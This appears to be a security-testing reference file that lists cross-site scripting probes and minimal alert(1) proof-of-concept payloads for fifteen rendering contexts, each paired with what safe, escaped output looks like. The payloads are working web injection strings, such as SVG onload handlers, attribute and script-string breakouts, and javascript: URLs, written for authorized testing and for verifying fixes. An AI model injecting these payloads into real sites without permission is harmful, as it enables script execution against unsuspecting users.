---
Vulnerability: XSS
Category: Payload
---

# XSS Payloads by Rendering Context (Responsible, PoC-focused)
**Purpose:** quick, context-based payloads for **authorized testing in a sandbox**. This file avoids obfuscated/evasion-heavy lists and focuses on clear, minimal PoCs that help you identify *context* and verify *fixes*.

> Use only with explicit permission. Prefer test tenants. Pair with encode-on-output and CSP hardening guidance in the stories.

---

## Legend
- **Probe:** non-destructive input to confirm reflection/context (ideally produces no execution).
- **PoC:** minimal, readable code execution to prove impact (e.g., `alert(1)`).
- **Safe tell:** what “safe rendering” looks like after fixes (the string is shown literally or safely escaped).

---

## 1) HTML **Text** context (between tags)
Typical sinks: server template output, `innerHTML` of text nodes.

- **Probe:** `XSS_TEST_<123>` → should render literally.
- **PoC (simple tag):** `<b>X</b>` → if it becomes bold, HTML is interpreted.
- **PoC (evented SVG):** `<svg onload=alert(1)>`
- **Safe tell:** `<` and `>` are encoded (e.g., `&lt;svg onload=alert(1)&gt;`).

**Notes:** If CSP blocks inline execution, `alert(1)` might not fire even though encoding is missing—still a bug. Use “bold-text” probe to detect HTML interpretation.

---

## 2) HTML **Attribute** context (quoted)
Value lands inside quotes of an attribute, e.g., `<div title="<HERE>">`

- **Probe:** `"` (double-quote) → should be encoded to `&quot;`.
- **PoC:** `" autofocus onfocus=alert(1) x="`
- **Safe tell:** The quote is escaped; new attributes **do not** appear.

**Variant (single-quoted attributes):**
- **Probe:** `'` → should be encoded to `&#39;` or `&apos;` (HTML5 compatible).
- **PoC:** `' autofocus onfocus=alert(1) a='`

---

## 3) HTML **Attribute** context (unquoted)
Value lands after `=` without surrounding quotes, e.g., `<img alt=<HERE>>`

- **Probe:** ` test` (space) → should be encoded; space must **not** create a new attribute.
- **PoC:** ` onmouseover=alert(1)`
- **Safe tell:** No new attributes; the value is quoted by the template or safely encoded.

**Notes:** Avoid unquoted attributes in templates; they are error-prone.

---

## 4) **Event handler attribute** (on\*)
If the value is written into an event handler attribute (e.g., `<div onclick="<HERE>">`), the interpreter treats it as JS.

- **Probe:** `1` → should be treated as a literal string by safe rendering.
- **PoC:** `alert(1)`
- **Safe tell:** The handler is not created from untrusted input; values are not interpolated into `on*` attributes at all.

**Notes:** The fix is architectural—do not bind user input into event attributes. Use addEventListener and data attributes.

---

## 5) **JavaScript string** context (inside `<script>` as a string)
Example: `<script>var msg = "<HERE>";</script>`

- **Probe:** `"` or `\` → should be escaped (`\"`, `\\`).
- **PoC:** `";alert(1);//`
- **PoC (single-quoted):** `';alert(1);//`
- **PoC (template literal):** `` `";${alert(1)}` ``
- **Safe tell:** Quotes and backslashes are escaped; no string break occurs.

**Notes:** Prefer JSON-in-script patterns and parse at runtime; still escape all special chars.

---

## 6) **Raw JavaScript** context (not in a string)
If a value lands directly in code position (rare in safe templates):

- **Probe:** `1` → should behave as a constant.
- **PoC:** `alert(1)` (dangerous; avoid constructs that allow this).
- **Safe tell:** Untrusted values are **never** concatenated into raw code; use data attributes or JSON.

---

## 7) **URL attribute** context (`href`, `src`, `action`, `formaction`)
Value is placed in a URL-bearing attribute.

- **Probe:** `test` → should become a safe path or be URL-encoded.
- **PoC (blocked in many apps):** `javascript:alert(1)`
- **PoC (data URL):** `data:text/html,<svg onload=alert(1)>` (often blocked by CSP or validators)
- **Safe tell:** Application validates **scheme** (http/https only), encodes characters, and rejects `javascript:` / `data:` for executable contexts.

**Notes:** Scheme allow-lists and URL-encoding are mandatory.

---

## 8) **Style** / CSS context
Modern browsers do **not** execute JS from CSS. However, CSS can still leak data or make network requests (e.g., `url()`), but not XSS in modern engines.

- **Probe:** `color:red` → should be treated as data.
- **Safe tell:** User input is not interpolated into raw `style` strings; instead, use sanitized style maps.

**Notes:** Historical `expression()` was IE-only and obsolete.

---

## 9) **SVG / MathML** context
When user input is allowed to form SVG/MathML nodes:

- **PoC:** `<svg onload=alert(1)>`
- **Safe tell:** Either SVG is sanitized (allow-list) or plain text encoded; no scripts/events allowed.

**Notes:** Many sanitizers accidentally allow risky SVG/MathML attributes. Prefer strict allow-lists or strip entirely unless necessary.

---

## 10) **HTML comment** context
If a value lands in `<!-- <HERE> -->`:

- **Probe:** `-->` → should be encoded or prevented; otherwise, can break out into HTML/JS contexts depending on template.
- **Safe tell:** Comments do not become execution vectors; breaking out of comments should not be possible.

---

## 11) **JSON in `<script type="application/json">`**
Not executed by the browser by default, but front-end code may parse it.

- **Probe:** `"` → must be JSON-escaped (e.g., `\"`).
- **PoC idea:** Not direct execution; look for **DOM code** that injects parsed values into dangerous sinks.
- **Safe tell:** JSON is safely parsed and rendered with encode-on-output later.

---

## 12) **DOM insertion sinks** (client-side rendering)
If code writes directly with dangerous sinks:

- **Sinks:** `innerHTML`, `outerHTML`, `document.write`, inline event attributes, `eval`, `Function`, `setTimeout('string')`.
- **PoC:** any of the **HTML Text / Attribute / JS String** payloads above, depending on the final context.
- **Safe tell:** Use `textContent`, element creation, and `setAttribute` with encoding; disallow string-eval.

---

## 13) **URL fragment / hash** (often used in SPAs)
If the app reads `location.hash` and writes to DOM:

- **Probe:** `#XSS_TEST`
- **PoC:** `#x=';alert(1);//` → only fires if the app injects into JS string or event attrs.
- **Safe tell:** Hash is parsed safely and rendered via safe APIs with encoding.

---

## 14) **postMessage** / cross-document messaging
If the app consumes messages and injects into DOM:

- **Probe:** `{ "msg": "XSS_TEST" }`
- **PoC:** `<img src=x onerror=alert(1)>` passed as message data (only executes if injected into a dangerous sink).
- **Safe tell:** Messages are validated; rendering uses safe APIs.

---

## 15) **Email/Report renderers** (HTML emails, PDF/HTML exports)
Payload executes in **another** renderer (Blind XSS scenarios).

- **Probe:** `XSS_TEST_EMAIL`
- **PoC:** `<svg onload=alert(1)>` (many email clients block scripts; still relevant in internal tools)
- **Safe tell:** Templates sanitize/encode; risky tags/attrs stripped.

---

## Non-executable markers (good for diffing safe vs unsafe)
- Angle brackets only: `< >`
- Quote breakers: `"` / `'` / `\`
- Attribute splitters: space, `/>`
- Control chars that should be encoded: `&`, backticks ``` ` ```

---

## What **not** to do in testing
- Do not use obfuscated/polyglot payloads against production systems.
- Do not brute-force payload lists; focus on **context** first.
- Do not rely on `alert(1)` alone; always show a **minimal real impact** in a safe environment.

---

## Quick cross-check when a payload "doesn't fire"
- Check CSP (it may block inline execution while encoding is still wrong).
- Confirm the **exact** final context (HTML text vs attribute vs JS string).
- Ensure your PoC matches that context’s escaping rules.
- For blind scenarios, use an **OOB** beacon instead of dialogs.

---

*Pair this catalog with the XSS stories in `vulns/xss/` for step-by-step: probes → PoC → fix → verification → detection → attack chain.*
